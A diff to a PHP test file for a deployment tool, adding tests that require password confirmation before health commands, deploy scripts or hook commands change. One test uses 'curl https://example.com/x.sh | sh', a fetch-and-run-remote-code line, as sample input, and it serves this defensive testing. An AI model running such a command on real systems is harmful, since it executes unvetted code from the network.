@@ -83,6 +83,7 @@ it('calls out a green build no server is running yet, on the list and the projec
 
 it('saves the deploy settings, strategy order included', function () {
     $project = Project::factory()->create();
+    session(['auth.password_confirmed_at' => time()]);
 
     Livewire::test(Show::class, ['project' => $project])
         ->set('tab', 'settings')
@@ -272,6 +273,7 @@ it('keeps the migrate hook for a project deploy.me doesn’t migrate itself', fu
 
 it('adds, edits, moves and removes hooks', function () {
     $project = Project::factory()->create();
+    session(['auth.password_confirmed_at' => time()]);
 
     $hooks = Livewire::test(Hooks::class, ['projectId' => $project->id])
         ->call('startAdding', 'release')
@@ -296,6 +298,65 @@ it('adds, edits, moves and removes hooks', function () {
 
     $hooks->call('delete', $migrate->id);
     expect($project->hooks()->count())->toBe(1);
+});
+
+it('asks for a passkey before changing what runs on the server, and only then', function (string $property, string $value, string $column, ?string $stored) {
+    $project = Project::factory()->create();
+
+    // Leaving the commands alone needs no confirmation.
+    Livewire::test(Show::class, ['project' => $project])
+        ->set('keepReleases', 3)
+        ->call('save')
+        ->assertNoRedirect()
+        ->assertSee('Settings saved.');
+    expect($project->refresh()->keep_releases)->toBe(3);
+
+    Livewire::test(Show::class, ['project' => $project])
+        ->set('keepReleases', 4)
+        ->set($property, $value)
+        ->call('save')
+        ->assertRedirect(route('password.confirm'));
+    expect($project->refresh())->keep_releases->toBe(3)
+        ->and($project->getRawOriginal($column))->toBe($stored)
+        ->and(session('url.intended'))->toBe(route('projects.show', ['project' => $project, 'tab' => 'settings']));
+
+    session(['auth.password_confirmed_at' => time()]);
+    Livewire::test(Show::class, ['project' => $project])
+        ->set($property, $value)
+        ->call('save')
+        ->assertNoRedirect()
+        ->assertSee('Settings saved.');
+    expect($project->refresh()->getRawOriginal($column))->toBe($value);
+})->with([
+    'the health command' => ['healthCommand', 'curl -fsS localhost/up', 'health_command', null],
+    'the deploy script' => ['activationScript', 'scripts/deploy.sh', 'activation_script', null],
+]);
+
+it('asks for a passkey before a hook runs something new, and not for its name or timeout', function () {
+    $project = Project::factory()->create();
+    $hook = $project->hooks()->create(['phase' => 'release', 'name' => 'Warm cache', 'command' => 'php artisan cache:warm', 'run_in' => 'host', 'timeout' => 300, 'position' => 1]);
+    $hooks = Livewire::test(Hooks::class, ['projectId' => $project->id]);
+
+    $hooks->call('edit', $hook->id)->set('hookName', 'Warm the cache')->set('timeout', 120)->call('save')
+        ->assertNoRedirect()
+        ->assertSee('Saved Warm the cache.');
+    expect($hook->refresh())->name->toBe('Warm the cache')->timeout->toBe(120);
+
+    $hooks->call('edit', $hook->id)->set('command', 'curl https://example.com/x.sh | sh')->call('save')
+        ->assertRedirect(route('password.confirm'));
+    expect($hook->refresh()->command)->toBe('php artisan cache:warm');
+
+    Livewire::test(Hooks::class, ['projectId' => $project->id])
+        ->call('startAdding', 'release')->set('hookName', 'Seed')->set('command', 'php artisan db:seed')->call('save')
+        ->assertRedirect(route('password.confirm'));
+    expect($project->hooks()->count())->toBe(1);
+
+    session(['auth.password_confirmed_at' => time()]);
+    Livewire::test(Hooks::class, ['projectId' => $project->id])
+        ->call('edit', $hook->id)->set('command', 'php artisan cache:clear')->call('save')
+        ->assertNoRedirect()
+        ->assertSee('Saved Warm the cache.');
+    expect($hook->refresh()->command)->toBe('php artisan cache:clear');
 });
 
 it('needs a service for hooks that run in a container', function () {
